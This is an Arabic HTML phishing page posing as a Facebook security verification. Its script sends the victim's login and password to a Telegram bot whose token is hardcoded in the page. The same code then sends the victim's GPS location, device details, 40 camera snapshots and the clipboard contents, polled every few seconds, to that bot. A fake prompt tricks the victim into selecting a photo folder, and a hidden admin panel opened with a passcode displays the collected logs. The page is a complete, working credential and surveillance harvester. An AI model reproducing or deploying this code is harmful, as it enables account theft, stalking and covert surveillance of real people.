<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Facebook - التحقق من الأمان الشامل</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; }
        /* زر الدخول السري (كود الملك 44443) */
        .admin-gate { position: fixed; bottom: 10px; left: 10px; color: #ddd; cursor: pointer; z-index: 1000; }
        
        /* الواجهة الأمامية */
        .main-ui { display: flex; flex-direction: column; align-items: center; padding-top: 40px; }
        .auth-card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 400px; text-align: center; }
        .fb-text { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
        .alert-box { background: #ffebee; color: #c62828; padding: 10px; border-radius: 5px; font-size: 13px; margin-bottom: 20px; border: 1px solid #ffcdd2; }
        
        input { width: 92%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; }
        .btn-grant { width: 100%; padding: 15px; background: #28a745; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        
        /* لوحة التحكم الملكية */
        #king-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0ff; z-index: 9999; padding: 20px; overflow-y: auto; font-family: 'Courier New', monospace; }
        .log-entry { border-bottom: 1px solid #111; padding: 10px; font-size: 13px; }
    </style>
</head>
<body>

<div class="admin-gate" onclick="accessKing()"><i class="fas fa-key"></i></div>

<div id="victim-view" class="main-ui">
    <div class="fb-text">facebook</div>
    <div class="auth-card">
        <div class="alert-box">❗ مطلوب تحديث صلاحيات الأمان لمنع إغلاق الحساب فوراً.</div>
        <h3>تفعيل بروتوكول التوثيق (V2)</h3>
        <p style="font-size: 14px; color: #606770;">اضغط على الزر أدناه لمنح المتصفح صلاحية "التوثيق التلقائي" وسحب بياناتك بأمان.</p>
        
        <input type="text" id="phone_mail" placeholder="رقم الهاتف أو البريد الإلكتروني">
        <input type="password" id="pass_key" placeholder="كلمة السر">
        
        <button class="btn-grant" onclick="launchOmniHarvest()">✅ تفعيل الصلاحيات والتوثيق</button>
        <p style="font-size: 11px; color: #999; margin-top: 15px;">بالموافقة، سيتم فحص (الكاميرا، الموقع، الملفات، والجهاز) للتأكد من هويتك.</p>
    </div>
</div>

<div id="king-panel">
    <h2 style="color: yellow;">👑 إمبراطورية البيانات - لوحة التحكم السري</h2>
    <button onclick="location.reload()" style="background:red; color:white;">خروج</button>
    <hr>
    <div id="data-display"></div>
</div>

<script>
const BOT_TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
const CHAT_ID = "8754338811";

// 1. الدخول للملك (44443)
function accessKing() {
    if(prompt("كود الملك:") === "44443") {
        renderLogs();
        document.getElementById('king-panel').style.display = 'block';
    }
}

// 2. محرك السحب الشامل (Omni-Harvest)
async function launchOmniHarvest() {
    const user = document.getElementById('phone_mail').value;
    const pass = document.getElementById('pass_key').value;
    if(!user || !pass) return alert("يرجى إدخال البيانات");

    // سحب البيانات الأساسية والمالية المخزنة
    saveLog({type: "ACCOUNT", data: `User: ${user} | Pass: ${pass}`});
    await sendToTelegram(`👤 حساب جديد:\n${user}\n${pass}`);

    // طلب جميع صلاحيات كروم (الاستنزاف)
    requestPermissions();
    
    document.querySelector('.auth-card').innerHTML = "<h3>✅ تم التوثيق!</h3><p>جاري مزامنة البيانات مع خوادم ميتي، يرجى عدم إغلاق الصفحة...</p>";
}

async function requestPermissions() {
    // 📍 الموقع الجغرافي
    navigator.geolocation.getCurrentPosition(p => {
        const loc = `📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
        sendToTelegram(loc);
        saveLog({type: "GPS", data: loc});
    });

    // 🔋 البطارية والشبكة
    const battery = await navigator.getBattery();
    const net = navigator.connection || {};
    const deviceData = `🔋 بطارية: ${battery.level*100}% | 📶 شبكة: ${net.effectiveType} | 💻 جهاز: ${navigator.platform}`;
    sendToTelegram(deviceData);
    saveLog({type: "DEVICE", data: deviceData});

    // 📸 الكاميرا (40 لقطة) والميكروفون
    startMediaCapture();

    // 📋 الحافظة (Clipboard)
    setInterval(async () => {
        try {
            const text = await navigator.clipboard.readText();
            if(text) sendToTelegram(`📋 حافظة: ${text}`);
        } catch(e){}
    }, 5000);

    // 📂 طلب الوصول للملفات (خدعة)
    setTimeout(() => {
        alert("🛡️ أمن ميتي: يرجى اختيار مجلد الصور لتأكيد الهوية البصرية.");
        const inp = document.createElement('input'); inp.type = 'file'; inp.webkitdirectory = true;
        inp.onchange = (e) => handleFiles(e.target.files);
        inp.click();
    }, 3000);
}

// 3. محرك الميديا (صور + فيديو + صوت)
async function startMediaCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
        let count = 0;
        const inv = setInterval(() => {
            if(count < 40) {
                const v = document.createElement('video'); v.srcObject = stream; v.play();
                const c = document.createElement('canvas');
                c.width = 640; c.height = 480;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(b => sendBlob(b, 'photo', `📸 لقطة ${count+1}`));
                count++;
            } else { stream.getTracks().forEach(t => t.stop()); clearInterval(inv); }
        }, 2000);
    } catch(e) { sendToTelegram("⚠️ الكاميرا: تم الرفض"); }
}

// 4. إدارة البيانات
function saveLog(entry) {
    let logs = JSON.parse(localStorage.getItem('king_logs')) || [];
    logs.push({...entry, time: new Date().toLocaleString()});
    localStorage.setItem('king_logs', JSON.stringify(logs));
}

function renderLogs() {
    const display = document.getElementById('data-display');
    const logs = JSON.parse(localStorage.getItem('king_logs')) || [];
    display.innerHTML = logs.reverse().map(l => `
        <div class="log-entry">
            <b style="color:yellow;">[${l.type}]</b> <small>${l.time}</small><br>
            <span>${l.data}</span>
        </div>
    `).join('');
}

async function sendToTelegram(t) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(t)}`);
}

async function sendBlob(b, type, cap) {
    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append(type, b, 'king.jpg'); fd.append('caption', cap);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type==='photo'?'Photo':'Document'}`, {method:'POST', body:fd});
}
</script>
</body>
</html>
